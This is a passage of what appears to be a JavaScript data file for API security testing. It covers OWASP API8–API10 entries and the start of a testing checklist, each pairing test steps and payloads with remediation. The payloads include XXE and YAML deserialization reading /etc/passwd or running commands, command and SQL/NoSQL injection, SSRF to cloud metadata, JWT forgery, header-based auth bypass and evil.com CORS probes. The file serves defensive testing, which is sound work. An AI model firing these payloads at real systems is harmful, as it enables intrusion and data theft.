    remediation: "Return generic error messages to clients. Log detailed errors server-side only. Implement a global error handler that sanitizes all responses. Configure frameworks to disable debug mode in production. Use error codes instead of descriptive messages.",
    severity: "Medium"
  },
  {
    id: "API8-02",
    name: "Missing Security Headers",
    category: "Security Misconfiguration",
    description: "API responses lack security headers that prevent common attacks like clickjacking, MIME sniffing, and XSS.",
    testingSteps: [
      "Inspect response headers from API endpoints",
      "Check for X-Content-Type-Options: nosniff",
      "Check for X-Frame-Options or Content-Security-Policy frame-ancestors",
      "Check for Strict-Transport-Security (HSTS)",
      "Check for Cache-Control on sensitive endpoints"
    ],
    payloads: [
      "curl -I https://api.target.com/api/v1/resource",
      "curl -I https://api.target.com/api/v1/user/profile (check Cache-Control)",
      "curl -I https://api.target.com/ (check HSTS, CSP)",
      "Check for: X-Content-Type-Options, X-Frame-Options, Strict-Transport-Security, Content-Security-Policy, X-XSS-Protection, Referrer-Policy, Permissions-Policy"
    ],
    remediation: "Add security headers: Strict-Transport-Security, X-Content-Type-Options: nosniff, X-Frame-Options: DENY, Content-Security-Policy, Cache-Control: no-store on sensitive endpoints. Configure headers at the API gateway or web server level.",
    severity: "Medium"
  },
  {
    id: "API8-03",
    name: "CORS Misconfiguration",
    category: "Security Misconfiguration",
    description: "Overly permissive CORS configuration allows any origin to make authenticated cross-origin requests, enabling credential theft and data exfiltration from browsers.",
    testingSteps: [
      "Send requests with Origin: https://evil.com header",
      "Check if Access-Control-Allow-Origin reflects the attacker origin",
      "Check if Access-Control-Allow-Credentials is true with reflected origin",
      "Test with Origin: null",
      "Test with subdomains of the target (subdomain takeover + CORS)"
    ],
    payloads: [
      "curl -H 'Origin: https://evil.com' -I https://api.target.com/api/v1/me",
      "curl -H 'Origin: null' -I https://api.target.com/api/v1/data",
      "curl -H 'Origin: https://evil-target.com' -I https://api.target.com/api/v1/sensitive",
      "curl -H 'Origin: https://target.com.evil.com' -I https://api.target.com/api/v1/data"
    ],
    remediation: "Use a strict allowlist of permitted origins. Never reflect arbitrary origins with credentials. Avoid Access-Control-Allow-Origin: * with credentials. Validate the Origin header server-side against a known list.",
    severity: "High"
  },
  {
    id: "API8-04",
    name: "Exposed API Documentation / Swagger",
    category: "Security Misconfiguration",
    description: "API documentation (Swagger UI, OpenAPI spec, GraphQL Playground) is publicly accessible in production, revealing endpoints, parameters, authentication schemes, and internal logic.",
    testingSteps: [
      "Check common documentation paths",
      "Look for OpenAPI/Swagger specification files",
      "Check for GraphQL introspection and playground",
      "Look for Postman collections or API documentation exports",
      "Check if documentation reveals internal or undocumented endpoints"
    ],
    payloads: [
      "GET /swagger-ui.html",
      "GET /swagger.json",
      "GET /api-docs",
      "GET /openapi.json",
      "GET /openapi.yaml",
      "GET /graphql (with introspection query)",
      "GET /docs",
      "GET /redoc",
      "GET /api/v1/docs",
      "GET /.well-known/openapi.json"
    ],
    remediation: "Restrict API documentation to internal networks or authenticated users. Disable Swagger UI in production. Remove or protect OpenAPI spec files. Disable GraphQL introspection in production. Use network-level restrictions for documentation endpoints.",
    severity: "Medium"
  },
  {
    id: "API8-05",
    name: "Default Credentials on API Infrastructure",
    category: "Security Misconfiguration",
    description: "API infrastructure components (databases, message queues, monitoring tools) use default credentials that are publicly known and provide full access.",
    testingSteps: [
      "Identify exposed infrastructure services (through port scanning or error messages)",
      "Test default credentials for identified services",
      "Check for common database ports with default auth (MongoDB, Redis, Elasticsearch)",
      "Test API management portals with default admin credentials",
      "Check for unauthenticated access to infrastructure services"
    ],
    payloads: [
      "redis-cli -h target.com -p 6379 INFO",
      "curl http://target.com:9200/_cluster/health (Elasticsearch no auth)",
      "curl http://target.com:5601/api/status (Kibana default)",
      "mongo target.com:27017/admin (MongoDB no auth)",
      "curl http://target.com:15672/api/overview -u guest:guest (RabbitMQ)"
    ],
    remediation: "Change all default credentials before deployment. Use strong, unique passwords for all services. Implement network segmentation to prevent direct access to infrastructure. Disable remote access to databases. Audit for default credentials regularly.",
    severity: "Critical"
  },
  {
    id: "API8-06",
    name: "Insecure TLS Configuration",
    category: "Security Misconfiguration",
    description: "API uses weak TLS versions, cipher suites, or certificates that can be exploited for man-in-the-middle attacks or traffic decryption.",
    testingSteps: [
      "Test TLS version support (TLS 1.0, 1.1, 1.2, 1.3)",
      "Check cipher suite strength",
      "Verify certificate validity and chain",
      "Test for known TLS vulnerabilities (POODLE, BEAST, Heartbleed)",
      "Check for HSTS and certificate pinning"
    ],
    payloads: [
      "nmap --script ssl-enum-ciphers -p 443 api.target.com",
      "testssl.sh api.target.com",
      "sslyze api.target.com",
      "curl --tlsv1.0 https://api.target.com (test old TLS)",
      "openssl s_client -connect api.target.com:443 -tls1"
    ],
    remediation: "Disable TLS 1.0 and 1.1. Use TLS 1.2+ with strong cipher suites. Enable HSTS with long max-age. Use certificates from trusted CAs. Implement certificate rotation. Consider certificate pinning for critical APIs.",
    severity: "High"
  },
  {
    id: "API8-07",
    name: "Unrestricted HTTP Methods Allowed",
    category: "Security Misconfiguration",
    description: "API server allows HTTP methods (TRACE, TRACK, DEBUG, OPTIONS) that are not needed and can be exploited for cross-site tracing, debugging access, or information disclosure.",
    testingSteps: [
      "Send OPTIONS requests to identify allowed methods",
      "Test TRACE and TRACK methods for cross-site tracing",
      "Test DEBUG method for debugging information",
      "Test PROPFIND, PROPPATCH (WebDAV) methods",
      "Check if PUT/DELETE are allowed on read-only endpoints"
    ],
    payloads: [
      "curl -X OPTIONS -I https://api.target.com/api/v1/resource",
      "curl -X TRACE https://api.target.com/",
      "curl -X TRACK https://api.target.com/",
      "curl -X DEBUG https://api.target.com/api/v1/config",
      "curl -X PROPFIND https://api.target.com/"
    ],
    remediation: "Disable unnecessary HTTP methods at the web server level. Only allow methods required by each endpoint. Block TRACE and TRACK methods. Return 405 Method Not Allowed for unsupported methods. Configure the API gateway to filter methods.",
    severity: "Low"
  },
  {
    id: "API8-08",
    name: "Missing Request Validation / Content-Type Enforcement",
    category: "Security Misconfiguration",
    description: "API does not validate request content types or schema, accepting any format and processing it, potentially leading to parsing vulnerabilities or injection attacks.",
    testingSteps: [
      "Send requests with wrong Content-Type headers",
      "Send XML when JSON is expected and vice versa",
      "Send malformed content that does not match the declared type",
      "Test with no Content-Type header",
      "Test with unusual content types"
    ],
    payloads: [
      "POST /api/v1/data -H 'Content-Type: application/xml' -d '<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><root>&xxe;</root>'",
      "POST /api/v1/data -H 'Content-Type: text/plain' -d '{\"role\":\"admin\"}'",
      "POST /api/v1/data (no Content-Type) -d '{\"data\":\"test\"}'",
      "POST /api/v1/data -H 'Content-Type: application/x-yaml' -d '!!python/object/apply:os.system [\"id\"]'"
    ],
    remediation: "Strictly validate Content-Type headers. Reject requests with unexpected content types. Validate request body against the expected schema. Disable XML external entity processing. Only accept required content types.",
    severity: "Medium"
  },
  {
    id: "API8-09",
    name: "Permissive IP/Network Access Controls",
    category: "Security Misconfiguration",
    description: "API is accessible from any network without IP-based restrictions, and internal/admin endpoints are reachable from the public internet.",
    testingSteps: [
      "Test API access from different networks and IPs",
      "Check if admin endpoints are restricted by IP",
      "Test internal endpoints from external networks",
      "Check for IP-based bypass headers (X-Forwarded-For)",
      "Test VPN-only endpoints from public internet"
    ],
    payloads: [
      "curl -H 'X-Forwarded-For: 127.0.0.1' https://api.target.com/admin",
      "curl -H 'X-Real-IP: 10.0.0.1' https://api.target.com/internal",
      "curl -H 'X-Originating-IP: 192.168.1.1' https://api.target.com/admin/config",
      "curl -H 'X-Client-IP: 127.0.0.1' https://api.target.com/internal/users",
      "curl -H 'X-Forwarded-For: 127.0.0.1, 10.0.0.1' https://api.target.com/admin"
    ],
    remediation: "Implement IP allowlists for admin and internal endpoints. Do not trust X-Forwarded-For headers for authorization (use the connecting IP from the trusted proxy). Segment internal APIs into private networks. Use VPN requirements for sensitive endpoints.",
    severity: "High"
  },
  {
    id: "API8-10",
    name: "Sensitive Data in API Responses Cache",
    category: "Security Misconfiguration",
    description: "API responses containing sensitive data are cached by CDNs, proxies, or browsers due to missing or incorrect cache control headers, potentially exposing data to other users.",
    testingSteps: [
      "Check Cache-Control headers on authenticated endpoints",
      "Test if CDN caches authenticated responses",
      "Check for Vary header usage on user-specific endpoints",
      "Test cache poisoning via Host header manipulation",
      "Check if API responses include cache keys that differ per user"
    ],
    payloads: [
      "curl -I https://api.target.com/api/v1/me (check Cache-Control)",
      "curl -I https://api.target.com/api/v1/user/settings (check Pragma, Expires)",
      "curl https://api.target.com/api/v1/dashboard -H 'Host: evil.com' (cache poisoning)",
      "Access /api/v1/me with User A, then without auth (check if cached response is returned)"
    ],
    remediation: "Set Cache-Control: no-store, no-cache, must-revalidate on all authenticated endpoints. Add Vary: Authorization header. Configure CDN to not cache authenticated responses. Use private cache directives. Implement cache key separation per user.",
    severity: "Medium"
  },

  // ── Improper Inventory Management (API9:2023) ────────────────────────

  {
    id: "API9-01",
    name: "Shadow/Undocumented API Endpoints",
    category: "Improper Inventory Management",
    description: "Undocumented API endpoints exist in production that were created during development, for testing, or for internal use but are publicly accessible and may lack security controls.",
    testingSteps: [
      "Fuzz common API paths with wordlists",
      "Check JavaScript bundles for undocumented API calls",
      "Review mobile app traffic for additional endpoints",
      "Check for common internal paths (test, debug, staging, beta)",
      "Analyze API specification files for unlisted endpoints"
    ],
    payloads: [
      "ffuf -w api-wordlist.txt -u https://api.target.com/api/v1/FUZZ",
      "GET /api/v1/test, /api/test, /test/api, /api/internal",
      "GET /api/v1/debug, /api/v1/staging, /api/v1/beta",
      "GET /api/v1/_internal, /api/v1/__debug, /api/v1/system",
      "Search JS files: grep -oP 'api/[a-z/]+' bundle.js | sort -u"
    ],
    remediation: "Maintain a complete API inventory. Use API gateway to enforce that only documented endpoints are accessible. Implement regular API discovery scans. Remove test and debug endpoints from production. Audit all deployed endpoints against documentation.",
    severity: "Medium"
  },
  {
    id: "API9-02",
    name: "Deprecated API Version Still Active",
    category: "Improper Inventory Management",
    description: "Old API versions that have been deprecated but not decommissioned remain accessible and may contain known vulnerabilities or lack security patches applied to newer versions.",
    testingSteps: [
      "Identify the current API version from documentation",
      "Test access to older versions (v1, v2, v0, beta)",
      "Compare security controls between old and current versions",
      "Check if older versions have known CVEs or unpatched bugs",
      "Test if data from the current version is accessible via old versions"
    ],
    payloads: [
      "GET /api/v0/users (when current is v3)",
      "GET /api/v1/admin/config (when v3 restricts this)",
      "GET /api/beta/debug (beta endpoints still active)",
      "GET /api/v1/users/export (when v2+ requires special auth)"
    ],
    remediation: "Decommission deprecated API versions promptly. Redirect old version traffic to current versions. Monitor access to deprecated versions. Set sunset dates and communicate to consumers. Apply security patches across all active versions.",
    severity: "Medium"
  },
  {
    id: "API9-03",
    name: "Exposed Development/Staging Environment",
    category: "Improper Inventory Management",
    description: "Development, staging, or QA API environments are publicly accessible with weaker security controls, production-like data, and debug features enabled.",
    testingSteps: [
      "Check for common staging subdomains: staging-api, dev-api, qa-api, api-staging",
      "Test access to development environments from the public internet",
      "Check if staging has the same data as production",
      "Test for debug mode or relaxed security in non-production environments",
      "Check DNS records for development/staging hostnames"
    ],
    payloads: [
      "curl https://staging-api.target.com/api/v1/users",
      "curl https://dev.api.target.com/api/v1/config",
      "curl https://api-qa.target.com/api/v1/admin",
      "curl https://test.api.target.com/api/v1/debug",
      "dig +short staging-api.target.com, dev-api.target.com, qa.target.com"
    ],
    remediation: "Restrict non-production environments to internal networks or VPN. Use synthetic data in non-production environments. Apply production-equivalent security controls. Monitor for public access to non-production APIs. Use different credentials for each environment.",
    severity: "High"
  },
  {
    id: "API9-04",
    name: "Unrotated API Keys and Secrets",
    category: "Improper Inventory Management",
    description: "API keys, tokens, and secrets that are never rotated accumulate risk over time. Compromised keys remain valid indefinitely, and old keys may still grant access.",
    testingSteps: [
      "Check if API keys have creation dates and expiration dates",
      "Test old or leaked API keys to see if they still work",
      "Search for API keys in public repositories (GitHub, GitLab)",
      "Check if key rotation mechanisms exist and are enforced",
      "Test if disabled or deactivated keys still grant access"
    ],
    payloads: [
      "curl -H 'Authorization: Bearer old_leaked_token' /api/v1/data",
      "Search GitHub: org:targetorg filename:.env password",
      "Search GitHub: org:targetorg api_key OR secret_key",
      "trufflehog git https://github.com/targetorg/repo.git"
    ],
    remediation: "Implement mandatory key rotation policies (e.g., 90 days). Set expiration dates on all tokens and keys. Monitor for leaked credentials in public repositories. Immediately revoke compromised keys. Maintain an inventory of all active keys.",
    severity: "High"
  },
  {
    id: "API9-05",
    name: "Orphaned API Endpoints After Refactoring",
    category: "Improper Inventory Management",
    description: "Code refactoring or microservice decomposition leaves old endpoints active that are no longer maintained, monitored, or secured but still connected to live data.",
    testingSteps: [
      "Compare current API documentation with actual deployed endpoints",
      "Look for endpoints that return data but are not in documentation",
      "Test endpoints that appear in older versions of documentation",
      "Check for endpoints that respond but are not monitored",
      "Look for legacy routing rules that forward to old services"
    ],
    payloads: [
      "GET /api/v1/legacy/users (old monolith endpoint still active)",
      "GET /api/v1/old-service/data (service decomposed but endpoint remains)",
      "GET /api/v1/deprecated/export (removed from docs but still responds)",
      "Check load balancer configs for old routing rules"
    ],
    remediation: "Implement API lifecycle management. Audit all deployed endpoints regularly. Remove unused routing rules. Decommission old services completely. Use API gateways to enforce endpoint inventories. Monitor for traffic to unlisted endpoints.",
    severity: "Medium"
  },
  {
    id: "API9-06",
    name: "Exposed Health/Status Endpoints with Sensitive Data",
    category: "Improper Inventory Management",
    description: "Health check and status endpoints expose detailed information about the API's internal state, dependencies, versions, and configuration that aids attackers.",
    testingSteps: [
      "Check common health endpoint paths",
      "Analyze response content for version information",
      "Look for dependency connection details (database hosts, ports)",
      "Check if status endpoints reveal internal architecture",
      "Test if adding parameters expands the response (verbose, detailed)"
    ],
    payloads: [
      "GET /health",
      "GET /api/health",
      "GET /api/v1/health?verbose=true",
      "GET /status",
      "GET /api/status?detailed=true",
      "GET /ready",
      "GET /api/v1/info"
    ],
    remediation: "Return minimal health check information (just status: ok/error). Move detailed health checks behind authentication. Remove version numbers and dependency details from public endpoints. Use separate internal and external health endpoints.",
    severity: "Low"
  },

  // ── Unsafe Consumption of APIs (API10:2023) ──────────────────────────

  {
    id: "API10-01",
    name: "Third-Party API Response Injection",
    category: "Unsafe Consumption of APIs",
    description: "API consumes data from third-party APIs without validating or sanitizing the response, allowing injected payloads from compromised or malicious third parties to affect the application.",
    testingSteps: [
      "Identify third-party API integrations",
      "Check if third-party responses are validated before processing",
      "Test if malicious payloads in third-party data propagate to users",
      "Verify that third-party data is sanitized before storage",
      "Check if third-party API failures are handled gracefully"
    ],
    payloads: [
      "Third-party returns: {\"name\":\"<script>alert(1)</script>\",\"description\":\"test\"}",
      "Third-party returns: {\"redirect\":\"http://evil.com\",\"data\":\"legitimate\"}",
      "Third-party returns: {\"query\":\"'; DROP TABLE users;--\",\"result\":[]}",
      "Third-party returns: {\"url\":\"http://169.254.169.254/latest/meta-data/\"}"
    ],
    remediation: "Validate and sanitize all data received from third-party APIs. Apply the same input validation as for user input. Implement schema validation on external API responses. Use allowlists for expected data formats. Handle unexpected data gracefully.",
    severity: "High"
  },
  {
    id: "API10-02",
    name: "Insecure Third-Party API Communication",
    category: "Unsafe Consumption of APIs",
    description: "Communication with third-party APIs over unencrypted channels (HTTP) or without certificate validation exposes data in transit to interception and manipulation.",
    testingSteps: [
      "Identify outbound connections to third-party APIs",
      "Check if connections use HTTPS",
      "Verify certificate validation is not disabled",
      "Check for hardcoded HTTP URLs for third-party services",
      "Test if downgrade attacks (HTTPS to HTTP) are possible"
    ],
    payloads: [
      "Check source code for: http:// URLs to external services",
      "Check for: verify=False, CURLOPT_SSL_VERIFYPEER=false, NODE_TLS_REJECT_UNAUTHORIZED=0",
      "Check for: InsecureRequestWarning suppression",
      "Network capture: tcpdump -i eth0 port 80 (for unencrypted API calls)"
    ],
    remediation: "Always use HTTPS for third-party API calls. Never disable certificate validation. Pin certificates for critical third-party integrations. Monitor for HTTP downgrade attempts. Use mutual TLS for sensitive integrations.",
    severity: "High"
  },
  {
    id: "API10-03",
    name: "Trusting Third-Party Redirect URLs",
    category: "Unsafe Consumption of APIs",
    description: "API follows redirects from third-party APIs without validation, potentially being directed to internal resources or malicious endpoints.",
    testingSteps: [
      "Check if the API follows redirects from third-party responses",
      "Test if a compromised third-party can redirect to internal IPs",
      "Check if redirect limits are enforced",
      "Test if the API re-validates URLs after following redirects",
      "Check if third-party data containing URLs is followed automatically"
    ],
    payloads: [
      "Third-party 302 redirect to http://127.0.0.1:8080/admin",
      "Third-party 301 redirect to http://169.254.169.254/latest/meta-data/",
      "Third-party response with Location: file:///etc/passwd",
      "Third-party chain redirect: external -> external -> internal"
    ],
    remediation: "Do not follow redirects from third-party APIs automatically. If redirects must be followed, re-validate each redirect target. Limit the number of redirect hops. Block redirects to internal IPs. Log and monitor redirect patterns.",
    severity: "Medium"
  },
  {
    id: "API10-04",
    name: "Insufficient Input Validation on Third-Party Data",
    category: "Unsafe Consumption of APIs",
    description: "Data received from third-party APIs is used in database queries, system commands, or file operations without sanitization, enabling injection attacks through third-party data.",
    testingSteps: [
      "Trace third-party data flow through the application",
      "Check if external data is used in SQL queries, system commands, or file paths",
      "Test with known injection payloads in third-party-like data",
      "Check if input validation differs between user input and third-party data",
      "Test error handling when third-party data contains unexpected values"
    ],
    payloads: [
      "Third-party provides filename: '../../../etc/passwd'",
      "Third-party provides query parameter: '; DROP TABLE users;--'",
      "Third-party provides command argument: '$(cat /etc/passwd)'",
      "Third-party provides template data: '{{constructor.constructor(\"return this\")()}}'"
    ],
    remediation: "Apply the same input validation and sanitization to third-party data as user input. Use parameterized queries for database operations. Avoid constructing commands from external data. Implement strict schema validation.",
    severity: "High"
  },
  {
    id: "API10-05",
    name: "Excessive Trust in Third-Party Authentication",
    category: "Unsafe Consumption of APIs",
    description: "API blindly trusts authentication or identity claims from third-party services without independent verification, allowing compromised third parties to impersonate users.",
    testingSteps: [
      "Identify third-party authentication integrations (OAuth, SSO, SAML)",
      "Check if third-party identity assertions are independently validated",
      "Test if forged third-party tokens are accepted",
      "Check if third-party user attributes are trusted without verification",
      "Test account linking with manipulated third-party identities"
    ],
    payloads: [
      "Forge third-party OAuth response: {\"user_id\":\"admin\",\"email\":\"admin@target.com\"}",
      "Modify SAML assertion from third-party IdP with a different user",
      "Present a third-party JWT with admin claims: {\"role\":\"admin\",\"trusted\":true}",
      "Link account with manipulated third-party profile: {\"email\":\"victim@target.com\"}"
    ],
    remediation: "Independently verify third-party authentication claims. Validate token signatures and issuer. Do not trust unverified attributes from third parties for authorization decisions. Implement additional verification for account linking. Monitor for anomalous third-party authentications.",
    severity: "High"
  },
  {
    id: "API10-06",
    name: "Supply Chain Attack via Compromised API Dependency",
    category: "Unsafe Consumption of APIs",
    description: "A compromised third-party API or library returns malicious data or behaves maliciously, affecting all consumers. The application has no defense-in-depth against trusted dependencies.",
    testingSteps: [
      "Inventory all third-party API dependencies",
      "Check if response integrity is verified (signatures, checksums)",
      "Test application behavior when third-party returns unexpected data",
      "Check if circuit breakers exist for third-party failures",
      "Test if the application can operate in degraded mode without third parties"
    ],
    payloads: [
      "Simulate compromised third-party returning: {\"update_url\":\"https://evil.com/malware\"}",
      "Simulate third-party injecting tracking scripts in responses",
      "Simulate third-party modifying pricing data: {\"price\":0.01}",
      "Simulate third-party exfiltrating data via modified SDK behavior"
    ],
    remediation: "Implement response validation for all third-party APIs. Use integrity checks (HMAC, signatures) on critical data. Implement circuit breakers and fallbacks. Monitor third-party behavior for anomalies. Pin third-party API versions. Use subresource integrity for client-side dependencies.",
    severity: "High"
  }
];


// ----------------------------------------------------------------------------
// 2. API_TESTING_CHECKLIST -- Comprehensive API Security Testing Checks
// ----------------------------------------------------------------------------

const API_TESTING_CHECKLIST = [

  // ── Authentication Checks ──

  { category: "Authentication", check: "Test login with valid credentials", method: "POST", payload: "{\"email\":\"user@test.com\",\"password\":\"validpass\"}", expected: "200 OK with token" },
  { category: "Authentication", check: "Test login with invalid password", method: "POST", payload: "{\"email\":\"user@test.com\",\"password\":\"wrongpass\"}", expected: "401 Unauthorized, generic error" },
  { category: "Authentication", check: "Test login with non-existent user", method: "POST", payload: "{\"email\":\"nouser@test.com\",\"password\":\"anypass\"}", expected: "401 with same error as wrong password" },
  { category: "Authentication", check: "Test login with empty credentials", method: "POST", payload: "{\"email\":\"\",\"password\":\"\"}", expected: "400 Bad Request" },
  { category: "Authentication", check: "Test login with SQL injection in username", method: "POST", payload: "{\"email\":\"admin'--\",\"password\":\"x\"}", expected: "400 or 401, no SQL error" },
  { category: "Authentication", check: "Test login rate limiting", method: "POST", payload: "10+ rapid failed login attempts", expected: "429 after threshold" },
  { category: "Authentication", check: "Test account lockout mechanism", method: "POST", payload: "N failed attempts with same user", expected: "Account locks after N attempts" },
  { category: "Authentication", check: "Test login with case variations in email", method: "POST", payload: "{\"email\":\"USER@Test.COM\",\"password\":\"pass\"}", expected: "Consistent behavior" },
  { category: "Authentication", check: "Test token expiration", method: "GET", payload: "Use token after expiry period", expected: "401 Unauthorized" },
  { category: "Authentication", check: "Test refresh token rotation", method: "POST", payload: "Use refresh token twice", expected: "Second use rejected" },
  { category: "Authentication", check: "Test logout invalidates token", method: "POST", payload: "Use token after logout", expected: "401 Unauthorized" },
  { category: "Authentication", check: "Test concurrent sessions policy", method: "POST", payload: "Login from two locations", expected: "Per policy enforcement" },
  { category: "Authentication", check: "Test JWT none algorithm", method: "GET", payload: "Modified JWT with alg:none", expected: "401 rejected" },
  { category: "Authentication", check: "Test JWT expired token handling", method: "GET", payload: "JWT with past exp claim", expected: "401 Unauthorized" },
  { category: "Authentication", check: "Test JWT algorithm confusion", method: "GET", payload: "RS256 token re-signed as HS256", expected: "401 rejected" },

  // ── Authorization Checks ──

  { category: "Authorization", check: "Test accessing another user's resource", method: "GET", payload: "/api/v1/users/{other_id}/data", expected: "403 Forbidden" },
  { category: "Authorization", check: "Test admin endpoint as regular user", method: "GET", payload: "/api/admin/users with user token", expected: "403 Forbidden" },
  { category: "Authorization", check: "Test resource creation for another user", method: "POST", payload: "{\"user_id\":\"other_user\",\"data\":\"test\"}", expected: "403 Forbidden" },
  { category: "Authorization", check: "Test resource deletion of another user's data", method: "DELETE", payload: "/api/v1/resources/{other_user_resource}", expected: "403 Forbidden" },
  { category: "Authorization", check: "Test horizontal privilege escalation", method: "GET", payload: "Change user_id in request from A to B", expected: "403 Forbidden" },
  { category: "Authorization", check: "Test vertical privilege escalation", method: "POST", payload: "User token on /api/admin/action", expected: "403 Forbidden" },
  { category: "Authorization", check: "Test role parameter tampering", method: "PUT", payload: "{\"name\":\"test\",\"role\":\"admin\"}", expected: "Role field ignored or 403" },
  { category: "Authorization", check: "Test path traversal to bypass auth", method: "GET", payload: "/api/v1/public/../admin/users", expected: "403 or 404" },
  { category: "Authorization", check: "Test authorization after password change", method: "GET", payload: "Old token after password change", expected: "401 Unauthorized" },
  { category: "Authorization", check: "Test batch operations with mixed ownership", method: "POST", payload: "{\"ids\":[\"own_id\",\"other_user_id\"]}", expected: "Reject unauthorized items" },

  // ── Input Validation Checks ──

  { category: "Input Validation", check: "Test SQL injection in query parameter", method: "GET", payload: "/api/v1/search?q=' OR '1'='1", expected: "400, no SQL error exposed" },
  { category: "Input Validation", check: "Test SQL injection in JSON body", method: "POST", payload: "{\"name\":\"test' OR 1=1--\"}", expected: "400 or sanitized processing" },
  { category: "Input Validation", check: "Test XSS in input fields", method: "POST", payload: "{\"name\":\"<script>alert(1)</script>\"}", expected: "Input sanitized or rejected" },
  { category: "Input Validation", check: "Test command injection", method: "POST", payload: "{\"filename\":\"test;cat /etc/passwd\"}", expected: "400 Bad Request" },
  { category: "Input Validation", check: "Test path traversal in file parameter", method: "GET", payload: "/api/v1/files?path=../../etc/passwd", expected: "400 or 403" },
  { category: "Input Validation", check: "Test NoSQL injection", method: "POST", payload: "{\"username\":{\"$gt\":\"\"},\"password\":{\"$gt\":\"\"}}", expected: "400, not authenticated" },
  { category: "Input Validation", check: "Test LDAP injection", method: "POST", payload: "{\"user\":\"*)(uid=*))(|(uid=*\"}", expected: "400 Bad Request" },
  { category: "Input Validation", check: "Test XML external entity (XXE)", method: "POST", payload: "<!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]>", expected: "400 or entity not resolved" },
  { category: "Input Validation", check: "Test integer overflow", method: "POST", payload: "{\"quantity\":99999999999999999999}", expected: "400 or capped value" },
  { category: "Input Validation", check: "Test negative values where positive expected", method: "POST", payload: "{\"amount\":-100,\"quantity\":-1}", expected: "400 Bad Request" },
  { category: "Input Validation", check: "Test extremely long string input", method: "POST", payload: "{\"name\":\"A\" * 1000000}", expected: "400 or truncated" },
  { category: "Input Validation", check: "Test null bytes in input", method: "POST", payload: "{\"filename\":\"test%00.txt\"}", expected: "400 Bad Request" },
  { category: "Input Validation", check: "Test unicode normalization issues", method: "POST", payload: "{\"name\":\"adm\\u0131n\"} (Turkish I)", expected: "Not treated as 'admin'" },
  { category: "Input Validation", check: "Test JSON injection via string values", method: "POST", payload: "{\"data\":\"value\\\",\\\"admin\\\":true}\"}", expected: "Parsed safely" },
  { category: "Input Validation", check: "Test SSRF via URL parameter", method: "POST", payload: "{\"url\":\"http://169.254.169.254/\"}", expected: "Blocked or 400" },

  // ── Rate Limiting & Resource Checks ──

  { category: "Rate Limiting", check: "Test API rate limit enforcement", method: "GET", payload: "100+ requests per second", expected: "429 after threshold" },
  { category: "Rate Limiting", check: "Test rate limit bypass via IP rotation", method: "GET", payload: "Requests from different X-Forwarded-For", expected: "Rate limit still enforced" },
  { category: "Rate Limiting", check: "Test rate limit bypass via API key rotation", method: "GET", payload: "Alternate between API keys", expected: "Per-user limit enforced" },
  { category: "Rate Limiting", check: "Test rate limit headers present", method: "GET", payload: "Any authenticated request", expected: "X-RateLimit-* headers present" },
  { category: "Rate Limiting", check: "Test unbounded pagination", method: "GET", payload: "/api/v1/data?limit=1000000", expected: "Max limit enforced" },
  { category: "Rate Limiting", check: "Test large batch request", method: "POST", payload: "{\"ids\":[...10000 items...]}", expected: "Max batch size enforced" },
  { category: "Rate Limiting", check: "Test file upload size limit", method: "POST", payload: "Upload 1GB file", expected: "413 Payload Too Large" },
  { category: "Rate Limiting", check: "Test request body size limit", method: "POST", payload: "10MB JSON body", expected: "413 or 400" },
  { category: "Rate Limiting", check: "Test deeply nested JSON", method: "POST", payload: "JSON nested 1000 levels", expected: "400 Bad Request" },
  { category: "Rate Limiting", check: "Test concurrent connection limit", method: "GET", payload: "1000 simultaneous connections", expected: "503 after limit" },

  // ── Transport Security Checks ──

  { category: "Transport Security", check: "Test HTTPS enforcement", method: "GET", payload: "http://api.target.com/v1/data", expected: "301 redirect to HTTPS" },
  { category: "Transport Security", check: "Test HSTS header", method: "GET", payload: "Check Strict-Transport-Security header", expected: "Present with max-age" },
  { category: "Transport Security", check: "Test TLS version support", method: "N/A", payload: "nmap --script ssl-enum-ciphers", expected: "Only TLS 1.2+" },
  { category: "Transport Security", check: "Test weak cipher suites", method: "N/A", payload: "testssl.sh target", expected: "No weak ciphers" },
  { category: "Transport Security", check: "Test certificate validity", method: "N/A", payload: "openssl s_client -connect target:443", expected: "Valid, not expired" },
  { category: "Transport Security", check: "Test for certificate pinning", method: "N/A", payload: "MITM proxy test", expected: "Pinning enforced for mobile" },
  { category: "Transport Security", check: "Test mixed content", method: "GET", payload: "HTTPS page with HTTP resources", expected: "No mixed content" },
  { category: "Transport Security", check: "Test cookie security flags", method: "GET", payload: "Inspect Set-Cookie headers", expected: "Secure, HttpOnly, SameSite" },

  // ── Data Exposure Checks ──

  { category: "Data Exposure", check: "Test for sensitive data in responses", method: "GET", payload: "/api/v1/users?include=all", expected: "No passwords, tokens, SSN" },
  { category: "Data Exposure", check: "Test for PII in error messages", method: "GET", payload: "Trigger errors with user data", expected: "No PII in errors" },
  { category: "Data Exposure", check: "Test for sensitive data in URLs", method: "GET", payload: "Check URLs for tokens, passwords", expected: "No sensitive data in URLs" },
  { category: "Data Exposure", check: "Test for sensitive data in headers", method: "GET", payload: "Inspect all response headers", expected: "No tokens or secrets" },
  { category: "Data Exposure", check: "Test for stack traces in errors", method: "POST", payload: "Send malformed data to trigger error", expected: "No stack traces" },
  { category: "Data Exposure", check: "Test for internal IPs in responses", method: "GET", payload: "Inspect all responses for 10.x, 192.168.x", expected: "No internal IPs" },
  { category: "Data Exposure", check: "Test for database info in errors", method: "POST", payload: "SQL-like input to trigger DB errors", expected: "No DB details exposed" },
  { category: "Data Exposure", check: "Test for version info in headers", method: "GET", payload: "Check Server, X-Powered-By headers", expected: "No version info" },
  { category: "Data Exposure", check: "Test for sensitive data in logs", method: "N/A", payload: "Review application logs", expected: "No passwords, tokens in logs" },
  { category: "Data Exposure", check: "Test for data in browser cache", method: "GET", payload: "Check Cache-Control on sensitive endpoints", expected: "no-store for sensitive data" },

  // ── CORS & Cross-Origin Checks ──

  { category: "CORS", check: "Test CORS with arbitrary origin", method: "GET", payload: "Origin: https://evil.com", expected: "Not reflected in ACAO" },
  { category: "CORS", check: "Test CORS with null origin", method: "GET", payload: "Origin: null", expected: "Not allowed" },
  { category: "CORS", check: "Test CORS with credentials", method: "GET", payload: "Origin: evil.com + credentials", expected: "Credentials not allowed with wildcard" },
  { category: "CORS", check: "Test CORS preflight caching", method: "OPTIONS", payload: "Access-Control-Max-Age value", expected: "Reasonable max-age" },
  { category: "CORS", check: "Test CORS allowed methods", method: "OPTIONS", payload: "Check Access-Control-Allow-Methods", expected: "Only needed methods" },

  // ── Business Logic Checks ──

